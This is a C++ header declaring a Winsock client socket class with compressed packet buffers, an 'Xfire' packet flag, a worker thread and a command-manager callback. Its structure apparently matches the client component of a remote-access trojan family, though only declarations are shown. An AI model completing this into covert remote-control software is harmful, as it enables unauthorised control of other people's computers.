// ClientSocket.h: interface for the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
#define AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_
#include <windows.h>
#include <winsock2.h>
#include <mswsock.h>
#include "Buffer.h"	// Added by ClassView
#include "Manager.h"

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

// Change at your Own Peril

// 'X' 'f' 'i' 'r' 'e' | PacketLen | UnZipLen
#define HDR_SIZE	13
#define FLAG_SIZE	5

//#include "myCrt.h"
struct authreq
{
	char Ver;
	char Ulen;
	char NamePass[256];
};


class CClientSocket
{
	friend class CManager;
public:
	CBuffer m_CompressionBuffer;
	CBuffer m_DeCompressionBuffer;
	CBuffer m_WriteBuffer;
	CBuffer	 m_ResendWriteBuffer;
	void Disconnect();
	bool Connect(LPCSTR lpszHost, UINT nPort);
	int Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void setManagerCallBack(CManager *pManager);

	void run_event_loop();
	bool IsRunning();

	HANDLE m_hWorkerThread;
	SOCKET m_Socket;
	HANDLE m_hEvent;

	HMODULE ws2_32;

	CClientSocket();
	virtual ~CClientSocket();

private:
	BYTE	m_bPacketFlag[FLAG_SIZE];
	static DWORD WINAPI WorkThread(LPVOID lparam);
	int SendWithSplit(LPBYTE lpData, UINT nSize, int nSplitSize);
	bool m_bIsRunning;
	CManager	*m_pManager;

};

#endif // !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
